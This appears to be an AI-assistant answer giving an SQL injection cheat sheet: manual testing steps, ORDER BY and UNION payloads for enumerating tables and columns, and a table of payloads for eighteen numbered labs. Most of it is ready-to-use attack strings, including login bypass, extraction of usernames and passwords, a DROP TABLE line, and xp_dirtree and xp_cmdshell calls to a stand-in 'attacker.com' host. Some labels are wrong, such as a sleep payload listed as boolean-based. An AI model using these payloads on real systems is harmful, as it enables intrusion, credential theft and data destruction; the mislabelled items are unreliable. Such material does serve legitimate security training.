Certainly! Here are some example commands that you can use to test for SQL injection vulnerabilities manually:

1. **Identify Input Fields**:
   - Use your browser's developer tools to inspect HTML forms and input fields.

2. **Test for Vulnerabilities**:

   - **Input Validation**:
     ```sql
     ' or 1=1 --
     " or 1=1 --
     ; DROP TABLE users; --
     ```

   - **Observing Error Messages**:
     - Inject a single quote `'` or a SQL keyword into the input field and observe any error messages displayed on the webpage.

   - **Browser Developer Tools**:
     - Use browser developer tools to intercept and modify requests. Inspect POST parameters for user-controlled data being sent to the server.

3. **Testing for Blind SQL Injection**:

   - **Boolean-Based**:
     ```sql
     ' or sleep(5) --
     ```

   - **Time-Based**:
     ```sql
     ' or sleep(5) and '1'='1
     ```

4. **Exploit the Vulnerability**:

   - Once a vulnerability is confirmed, exploit it to extract data from the database:
     - Union-Based Injection:
       ```sql
       ' UNION SELECT 1,2,3 --
       ```

     - Error-Based Injection:
       ```sql
       ' AND 1=CONVERT(INT,(SELECT CHAR(66)+CHAR(82)))
       ```

5. **Perform In-Depth Testing**:
   - Try different injection techniques and payloads to identify potential vulnerabilities.

6. **Document Findings**:
   - Keep track of the input fields, injected payloads, and observed behaviors.

7. **Report Vulnerabilities**:
   - Report the vulnerabilities to the website or application owner or security team, including detailed information on the vulnerabilities and steps to reproduce them.

Certainly! When testing for SQL injection vulnerabilities, the `ORDER BY` clause can be exploited to manipulate the order in which query results are returned. Here are some example payloads for exploiting the `ORDER BY` clause:

1. **Identify the Number of Columns**:
   - Use `ORDER BY` with increasing column numbers until an error occurs or until you see a change in the application's response. This helps determine the number of columns in the SELECT statement.
     ```sql
     ' ORDER BY 1 --
     ' ORDER BY 2 --
     ' ORDER BY 3 --
     ```

2. **Retrieve Specific Columns**:
   - Once you know the number of columns, you can use `UNION SELECT` to retrieve data from specific columns in other tables.
     ```sql
     ' UNION SELECT column1, column2 FROM table_name --
     ```

3. **Retrieve Table Names**:
   - Use `UNION SELECT` with `TABLE_NAME` to retrieve the names of tables in the database.
     ```sql
     ' UNION SELECT TABLE_NAME, NULL FROM INFORMATION_SCHEMA.TABLES --
     ```

4. **Retrieve Column Names**:
   - Use `UNION SELECT` with `COLUMN_NAME` to retrieve the names of columns in a specific table.
     ```sql
     ' UNION SELECT COLUMN_NAME, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'table_name' --
     ```

5. **Retrieve Data from a Specific Table**:
   - Use `UNION SELECT` to retrieve data from a specific table.
     ```sql
     ' UNION SELECT column1, column2 FROM table_name --
     ```

6. **Ordering Results**:
   - You can also manipulate the ordering of results using `ORDER BY`.
     ```sql
     ' ORDER BY column_name ASC --  (Ascending)
     ' ORDER BY column_name DESC -- (Descending)
     ```
## LAB

| Lab Number | Description                                                                       | Payload Example                                            |
|------------|-----------------------------------------------------------------------------------|------------------------------------------------------------|
| Lab #1     | SQL injection vulnerability in WHERE clause allowing retrieval                     | `' OR 1=1--`                                               |
| Lab #2     | SQL injection vulnerability allowing login bypass                                  | `' OR '1'='1'--`                                           |
| Lab #3     | SQLi UNION attack determining the number of columns returned                      | `1' UNION SELECT NULL, NULL, NULL--`                       |
| Lab #4     | SQL injection UNION attack, finding a column containing text                      | `1' UNION SELECT NULL, NULL, 'text'--`                     |
| Lab #5     | SQL injection UNION attack, retrieving data from other tables                     | `1' UNION SELECT username, password, NULL FROM users--`    |
| Lab #6     | SQL injection UNION attack, retrieving multiple values in a single query          | `1' UNION SELECT username, password, email FROM users--`    |
| Lab #7     | SQL injection attack, querying the database type and version | `1' UNION SELECT 1,2,@@version--`                         |
| Lab #8     | SQLi attack, querying the database type and version on MySQL | `1' UNION SELECT 1,2,@@version--`                         |
| Lab #9     | SQL injection attack, listing the database contents on non-title | `1' UNION SELECT table_name, NULL, NULL FROM information_schema.tables--` |
| Lab #10    | SQL injection attack, listing the database contents on Oracle | `1' UNION SELECT table_name, NULL, NULL FROM all_tables--` |
| Lab #11    | Blind SQL injection with conditional responses              | `1' AND (SELECT COUNT(*) FROM users) > 0--`               |
| Lab #12    | Blind SQL injection with conditional errors                  | `1' AND 1=2 AND 'a'='a`                                   |
| Lab #13    | Blind SQL injection with time delays                         | `1' AND IF(SLEEP(5),1,0)--`                               |
| Lab #14    | Blind SQL injection with time delays and information retrieval | `1' AND IF(SLEEP(5),1,0) AND 'a'='a`                    |
| Lab #15    | Blind SQL injection with out-of-band interaction             | `1'; EXEC xp_dirtree '//attacker.com'--`                 |
| Lab #16    | Blind SQL injection with out of band data exfiltration       | `1'; EXEC xp_cmdshell 'ping attacker.com'--`             |
| Lab #17    | SQL injection with filter bypass via XML encoding            | `1' OR XMLAGG(XMLELEMENT(name,chr(58))) IS NOT NULL--`   |
| Lab #18    | Visible error-based SQL injection                            | `1' AND 1=CONVERT(INT,(SELECT CHAR(66)+CHAR(82)))--`     |

